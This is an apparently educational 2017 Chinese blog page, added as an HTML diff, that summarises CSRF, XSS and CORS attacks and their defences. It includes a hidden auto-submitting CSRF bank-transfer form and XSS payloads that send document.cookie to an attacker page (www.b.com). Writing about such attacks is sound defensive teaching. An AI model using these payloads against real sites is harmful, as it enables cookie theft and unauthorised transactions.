@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<!--[if lte IE 8 ]>
+<html class="ie" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
+<![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!-->
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
+<!--<![endif]-->
+
+<head>
+    <title>js攻击总结 | eWangsf</title>
+    <!-- Meta data -->
+    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="generator" content="eWangsf">
+    <meta name="author" content="wangsufei">
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <link rel="Shortcut Icon" href="/img/favicon.ico" type="image/ico">
+
+    <link rel="alternate" href="/atom.xml" title="eWangsf" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/all.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/mine.css" media="screen" type="text/css">
+    
+    <link rel="stylesheet" href="/highlightjs/vs.css" type="text/css">
+    
+    <link rel="stylesheet" href="/css/iconfont.css" media="screen" type="text/css">
+    
+    <!-- Load our stylesheet for IE8 -->
+    <!--[if IE 8]>
+        <link rel="stylesheet" type="text/css" href="/css/ie8.css" />
+    <![endif]-->
+
+    <!-- Google Webfonts (Monserrat 400/700, Open Sans 400/600) -->
+    <link href='//fonts.useso.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>
+    <link href='//fonts.useso.com/css?family=Open+Sans:400,600' rel='stylesheet' type='text/css'>
+
+    <!-- Load our fonts individually if IE8+, to avoid faux bold & italic rendering -->
+    <!--[if IE]>
+    <link href='http://fonts.useso.com/css?family=Montserrat:400' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.useso.com/css?family=Montserrat:700' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.useso.com/css?family=Open+Sans:400' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.useso.com/css?family=Open+Sans:600' rel='stylesheet' type='text/css'>
+    <![endif]-->
+
+    <!-- jQuery | Load our jQuery, with an alternative source fallback to a local version if request is unavailable -->
+    <script src="/js/jquery-1.11.1.min.js"></script>
+    <script>
+        window.jQuery || document.write('<script src="js/jquery-1.11.1.min.js"><\/script>')
+    </script>
+
+    <!-- Load these in the <head> for quicker IE8+ load times -->
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="/js/html5shiv.min.js"></script>
+    <script src="/js/respond.min.js"></script>
+    <![endif]-->
+
+    
+    
+    
+
+    
+    <style>
+        .col-md-8.col-md-offset-2.opening-statement img {
+            display: none;
+        }
+    </style>
+</head>
+
+
+<body id="index" class="lightnav animsition">
+
+      <!-- ============================ Off-canvas navigation =========================== -->
+
+    <div class="sb-slidebar sb-right sb-style-overlay sb-momentum-scrolling">
+        <div class="sb-close" aria-label="Close Menu" aria-hidden="true">
+            <img src="/img/close.png" alt="Close"/>
+        </div>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu">
+            <li><a href="/" class="animsition-link" title="Home">Home</a></li>
+            <li><a href="/archives" class="animsition-link" title="archive">archives</a></li>
+            <!-- Dropdown Menu -->
+			
+            
+            
+        </ul>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu secondary">
+            <li><a href="/about.html" class="animsition-link" title="about">About</a></li>
+            <li><a href="/atom.xml" class="animsition-link" title="rss">RSS</a></li>
+        </ul>
+    </div>
+    
+<!-- ============================ END Off-canvas navigation =========================== -->
+
+<!-- ============================ #sb-site Main Page Wrapper =========================== -->
+
+    <div id="sb-site">
+
+        <!-- ============================ Header & Logo bar =========================== -->
+
+        <div id="navigation" class="navbar navbar-fixed-top">
+            <div class="navbar-inner">
+                <div class="container">
+                    <div class="logo">
+                        <a href="/" title="Logo" class="animsition-link">
+                             <img src="" data-src="/img/za.png" alt="Logo"/> 
+                        </a>
+                    </div>
+                    <nav>
+                        <ul class="nav">
+                            <li><a href="/" class="animsition-link">eWangsf</a></li>
+                            <li class="nolink"><span>Always </span>Stubborn.</li>
+                            
+                            <li><a href="https://github.com/eWangsf" title="Github" target="_blank"><i class="icon iconfont">&#xe69f;</i></a></li>
+                            
+                            
+                            <li><a href="http://weibo.com/u/2883112052" title="Sina-Weibo" target="_blank"><i class="icon iconfont">&#xe619;</i></a></li>
+                            
+                            
+                            <li><a href="https://www.zhihu.com/people/xiao-wei-wei-jiu-kuai-jiu" title="Zhihu" target="_blank"><i class="icon iconfont">&#xe829;</i></a></li>
+                            
+                            
+                            <li><a href="mailto:wangsufeizju@gmail.com" title="mail" target="_blank"><i class="icon iconfont">&#xe7ba;</i></a></li>
+                            
+                            <li class="nolink"><span>Welcome!</span></li>
+                        </ul>
+                    </nav>
+                </div>
+                <div class="learnmore sb-toggle-right">More</div>
+                <button type="button" class="navbar-toggle menu-icon sb-toggle-right" title="More">
+                    <span class="sr-only">Toggle navigation</span>
+                    <span class="icon-bar before"></span>
+                    <span class="icon-bar main"></span>
+                    <span class="icon-bar after"></span>
+                </button>
+            </div>
+        </div>
+
+        <!-- ============================ END Header & Logo bar =========================== -->
+<!-- ============================ END #sb-site Main Page Wrapper =========================== -->
+
+      
+<section id="intro">
+    <div class="container">
+        <div class="row col-md-offset-2">
+            <div class="col-md-8">
+    			<span class="post-meta">
+    <time datetime="2017-03-27T12:54:16.000Z" itemprop="datePublished">
+        2017-03-27
+    </time>
+    
+        
+        | 
+            <a href='/tags/tips/'>tips</a>
+            
+        
+    
+</span>
+                <h1>js攻击总结</h1>
+            </div>
+        </div>
+        <div class="col-md-8 col-md-offset-2 articlecontent">
+      		<h2 id="CSRF-XSRF-Cross-site-request-forgery"><a href="#CSRF-XSRF-Cross-site-request-forgery" class="headerlink" title="CSRF / XSRF (Cross-site request forgery)"></a>CSRF / XSRF (Cross-site request forgery)</h2><p>跨站请求伪造。指的是攻击者通过向用户页面注入一段可以引起请求的代码，在用户未意识到的情况下请求某些网站的一种攻击。<br>攻击原理如下：<br><img src="CSRF.png" class="img img-md" alt=""><br>由图可见，要完成 CSRF 攻击，用户需完成两个步骤：</p>
+<ul>
+<li>访问受信任网站 A，在本地生成 cookie</li>
+<li>在 cookie 未过期之前访问危险网站 B</li>
+</ul>
+<p>对于用户来说，只要以上步骤有一个未发生就可避免攻击，但是，用户无法保证:</p>
+<ul>
+<li>在访问 A 网站的时候不开个新页面访问 B 网站。</li>
+<li>每次访问 B 网站都能保证 A 的 cookie 已过期</li>
+<li>图中所谓的攻击网站，可能也只是个嵌入了攻击信息的可信任的经常被人访问的网站</li>
+</ul>
+<p>一般来说，在用户登录的时候，服务器会返回 cookie 给客户机，客户机之后发出的每个请求中都带有这个 cookie，提供身份认证及其他信息。攻击者通过广告等方式，诱导被攻击方浏览器发起自己想要的请求，这样被攻击方的身份信息也会随着请求一起发出去，以达到攻击目的。<br>也就是说，CSRF 的关键就是被攻击者的 cookie.</p>
+<h4 id="场景举例"><a href="#场景举例" class="headerlink" title="场景举例"></a>场景举例</h4><ul>
+<li>html 中含 get 请求 <code>&lt;img src=&quot;http://example.org/buy.php?symbol=SCOX&amp;shares=1000&quot; /&gt;</code></li>
+<li>内含 iframe post 攻击<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">　　&lt;head&gt;</div><div class="line">　　　　&lt;script type=&quot;text/javascript&quot;&gt;</div><div class="line">　　　　　　function steal()</div><div class="line">　　　　　　&#123;</div><div class="line">          　　　　 iframe = document.frames[&quot;steal&quot;];</div><div class="line">　　     　　      iframe.document.Submit(&quot;transfer&quot;);</div><div class="line">　　　　　　&#125;</div><div class="line">　　　　&lt;/script&gt;</div><div class="line">　　&lt;/head&gt;</div><div class="line">　　&lt;body onload=&quot;steal()&quot;&gt;</div><div class="line">　　　　&lt;iframe name=&quot;steal&quot; display=&quot;none&quot;&gt;</div><div class="line">　　　　　　&lt;form method=&quot;POST&quot; name=&quot;transfer&quot;　action=&quot;http://www.myBank.com/Transfer.php&quot;&gt;</div><div class="line">　　　　　　　　&lt;input type=&quot;hidden&quot; name=&quot;toBankId&quot; value=&quot;11&quot;&gt;</div><div class="line">　　　　　　　　&lt;input type=&quot;hidden&quot; name=&quot;money&quot; value=&quot;1000&quot;&gt;</div><div class="line">　　　　　　&lt;/form&gt;</div><div class="line">　　　　&lt;/iframe&gt;</div><div class="line">　　&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<hr>
+<h2 id="CSRF-防御"><a href="#CSRF-防御" class="headerlink" title="CSRF 防御"></a>CSRF 防御</h2><p>CSRF的防御可从客户机和服务机两方面着手。</p>
+<h4 id="客户机"><a href="#客户机" class="headerlink" title="客户机"></a>客户机</h4><ul>
+<li>请求头中带上 token 并在服务端验证<br>  CSRF 之所以可以请求成功是因为请求需要的信息全部存在于 cookie 中，要是请求需要除 cookie 之外的信息，那么就算攻击者的请求带上了 cookie 也不能成功。<br>  token 验证在用户登录时产生，并放置于 session 中，用户可以通过如登录请求返回值之类的方式获取这个值，然后以后的每次请求都带上这个值，客户端每次接受请求都会判断拿到的 token 是否与 session 中的一致，如果不一致，就被判定为 csrf 攻击并丢弃。<br>  （这种方式难以保证 token 的安全，比如黑客可以诱导用户访问自己的网站，而请求信息中就包含了 token，也会被获取到，从而开始攻击）</li>
+<li>HTTP 头中自定义属性并验证<br>  也是 token 验证的一种，不过 token 不是放在 http 的请求体中，而是通过 XMLHttpRequest.setRequestHeader(“xsrftoken”, “xxx”) 将 token 信息放置到 http 头部<br>  （这种方式只支持 ajax 请求，局限性太大）</li>
+</ul>
+<h4 id="服务机"><a href="#服务机" class="headerlink" title="服务机"></a>服务机</h4><ul>
+<li>HTTP referer字段<br>  http 头部的 referer 字段记录发起请求的源地址，如果是页面中的 button 的形式的请求，那么该值与 Request URL 中的值的 host 部分应该是相同的。而若是例子中的 CSRF，则 referer host部分是攻击者的 host，因此，可以在某些敏感操作（如转账）等操作之前验证 referer 的合法性。<br>  （这种方法依赖于客户端提供的信息，高版本浏览器中没有问题，但是 IE6 等低版本浏览器中可以被伪造，所以并非万无一失） </li>
+</ul>
+<hr>
+<h2 id="XSS-Cross-site-Scripting"><a href="#XSS-Cross-site-Scripting" class="headerlink" title="XSS (Cross-site Scripting)"></a>XSS (Cross-site Scripting)</h2><p>跨站脚本攻击。利用网站的 xss 漏洞在用户浏览器中运行攻击者的恶意脚本，达成某种目的的攻击。比如：</p>
+<ul>
+<li>脚本获取用户的 cookie 信息</li>
+<li>获取用户权限，使用 web 应用</li>
+<li>可以向用户页面嵌入伪造的数据表单，以钓鱼方式获取用户信息</li>
+</ul>
+<p>xss 攻击分两种： DOM Based XSS 和 Stored XSS</p>
+<h4 id="DOM-Based-XSS"><a href="#DOM-Based-XSS" class="headerlink" title="DOM Based XSS"></a>DOM Based XSS</h4><p>若发现页面中某些内容显示的是该页面 url 中的某个参数，那么可以通过改变参数内容达到攻击目的。</p>
+<ul>
+<li>若 A 网站内某页面 url 为 <code>www.a.com?name=ewangsf</code> 而 name 参数直接显示在页面右上角 “Hello ewangsf!”，那么可以构造一个 url : <code>www.a.com?name=&lt;script&gt;window.open(&quot;www.b.com?data=&quot; + document.cookie)&lt;/script&gt;</code>，这里 <code>www.b.com</code> 是攻击者的页面，在该页面内可以获取到 <code>www.a.com</code> 的 cookie 信息。</li>
+<li>主机 C 提供免费 wifi，开启特殊的 DNS 将所有域名都解析到 C 上，并将 wifi 的 DHCP-DNS 设置为 C 的 IP，这样所有连着这个 wifi 的电脑发出的请求都会被 C 截获，C 将请求正常发出到目标服务器上，但是在响应返回的时候，往响应体内注入脚本实现攻击目的<br>这种攻击方式危害不大，因为受害者必须主动点击才能被攻击。<h4 id="Stored-Based-XSS"><a href="#Stored-Based-XSS" class="headerlink" title="Stored Based XSS"></a>Stored Based XSS</h4>用户输入的数据中可以包含攻击代码，这些信息被原样存储到数据库中，则每个能看到该数据的人都会被攻击。</li>
+<li>用户在某个表单的 intro 字段中输入： <code>&lt;script&gt;window.open(&quot;www.b.com?data=&quot; + document.cookie)&lt;/script&gt;</code>，假设该字段未被做任何处理，则所有可以看到这个介绍文字的人的 cookie 都会被上传到攻击者网站中</li>
+</ul>
+<p>这种攻击模式下，所有看得到文本的用户都会被攻击，范围广，危害大。</p>
+<hr>
+<h2 id="XSS-防御"><a href="#XSS-防御" class="headerlink" title="XSS 防御"></a>XSS 防御</h2><ul>
+<li>对于输入值做过滤，只允许合法的值，如数量表单只允许输入数字，邮件只允许数字字母和@符号和.符号</li>
+<li>自定义白名单，对于 html 中的属性做过滤，如去掉所有除 title 之外的属性</li>
+<li>HTML encode: <code>&lt;</code> =&gt; <code>&amp;lt;</code> <code>&gt;</code> =&gt; <code>&amp;gt;</code> <code>&amp;</code> =&gt; <code>&amp;amp;</code> <code>&quot;</code> =&gt; <code>&amp;quot;</code><br>  可以使用正则匹配或者依照第三方库的方式完成。</li>
+</ul>
+<hr>
+<h2 id="CORS-Cross-origin-Resource-Sharing"><a href="#CORS-Cross-origin-Resource-Sharing" class="headerlink" title="CORS (Cross-origin Resource Sharing)"></a>CORS (Cross-origin Resource Sharing)</h2><p>HTML5 中允许了 CORS 的跨域方式，放松了请求的限制，只要在服务器中配置 <code>Access-Control-Allow-Origin</code> ，将需要允许的域名加到配置值中，就可以实现跨域。这种方式同样也带来一些风险</p>
+<ul>
+<li>只要请求头中的 Origin 是允许的值请求就会被允许，但是请求头是可以被伪造的</li>
+<li>如果请求客户方被入侵，黑客利用客户机提交危险操作，比如删除账户等</li>
+<li>如果请求服务方被入侵，制造了些有害数据，若客户方未加保护地展现数据可能会导致某些不可预料的后果</li>
+<li>黑客可以在某些存在 xss 漏洞的页面上注入脚本，一旦客户机访问了这些页面，就会向服务机请求，将结果发送给攻击者</li>
+</ul>
+<hr>
+<h2 id="CORS-防御"><a href="#CORS-防御" class="headerlink" title="CORS 防御"></a>CORS 防御</h2><ul>
+<li>在跨域请求中要求身份验证，如 sessionID 和 cookie</li>
+<li>服务方尽量少地暴露的接口，仅允许必须的操作</li>
+<li>通过对 http 头的判断，尽可能多地过滤非法请求和可疑请求</li>
+</ul>
+<hr>
+<p><strong><em>参考</em></strong><br><a href="https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/" target="_blank" rel="external">CSRF 攻击的应对之道</a><br><a href="http://netsecurity.51cto.com/art/200812/102951.htm" target="_blank" rel="external">深入解析跨站请求伪造漏洞：原理剖析(1)</a><br><a href="http://netsecurity.51cto.com/art/200811/97281.htm" target="_blank" rel="external">Web安全测试之跨站请求伪造（CSRF）篇(1)</a><br><a href="http://netsecurity.51cto.com/art/200812/102925.htm" target="_blank" rel="external">深入解析跨站请求伪造漏洞：实例讲解(1)</a><br><a href="http://liuwanlin.info/webgong-ji-yu-fang-hu/#h4-3" target="_blank" rel="external">Web攻击与防护</a></p>
+
+            <div class="clearfix"></div>
+            <hr class="nogutter">
+        </div>
+        <nav class="pagination" role="pagination">
+    
+    
+    <a class="pull-right" href="/2017/03/21/总结/">
+        总结 →
+    </a>
+    
+</nav>
+
+        <!-- <div class="duoshuo">
+</div> -->
+    </div>
+</section>
+
+
+
+
+
+
+      
+<!-- ============================ Footer =========================== -->
+
+<footer>
+    <div class="container">
+        <div class="copy">
+            <p>
+                &copy; 2014<script>new Date().getFullYear()>2010&&document.write("-"+new Date().getFullYear());</script>, Content By wangsufei. All Rights Reserved.
+            </p>
+            <p></p>
+        </div>
+        <div class="social">
+            <ul>
+                
+                <li><a href="https://github.com/eWangsf" title="Github" target="_blank"><i class="icon iconfont">&#xe69f;</i></a></li>
+                
+                
+                <li><a href="http://weibo.com/u/2883112052" title="Sina-Weibo" target="_blank"><i class="icon iconfont">&#xe619;</i></a></li>
+                
+                
+                <li><a href="https://www.baidu.com/" title="Wechat" target="_blank"><i class="icon iconfont">&#xe604;</i></a></li>
+                
+                
+                <li><a href="https://www.zhihu.com/people/xiao-wei-wei-jiu-kuai-jiu" title="Zhihu" target="_blank"><i class="icon iconfont">&#xe829;</i></a></li>
+                
+            </ul>
+        </div>
+        <div class="clearfix"></div>
+    </div>
+</footer>
+
+<!-- ============================ END Footer =========================== -->
+      <!-- Load our scripts -->
+        
+<!-- Resizable 'on-demand' full-height hero -->
+<script type="text/javascript">
+    
+    var resizeHero = function () {
+        var hero = $(".cover,.heightblock"),
+            window1 = $(window);
+        hero.css({
+            "height": window1.height()
+        });
+    };
+    
+    resizeHero();
+    
+    $(window).resize(function () {
+        resizeHero();
+    });
+</script>
+<script src="/js/plugins.min.js"></script><!-- Bootstrap core and concatenated plugins always load here -->
+<script src="/js/jquery.flexslider-min.js"></script><!-- Flexslider plugin -->
+<script src="/js/scripts.js"></script><!-- Theme scripts -->
+
+<!-- Initiate flexslider plugin -->
+<script type="text/javascript">
+    $(document).ready(function($) {
+        $('.flexslider').flexslider({
+            animation: "fade",
+            prevText: "",
+            nextText: "",
+            directionNav: true
+        });
+    });
+</script>
+
+</body>
+</html>
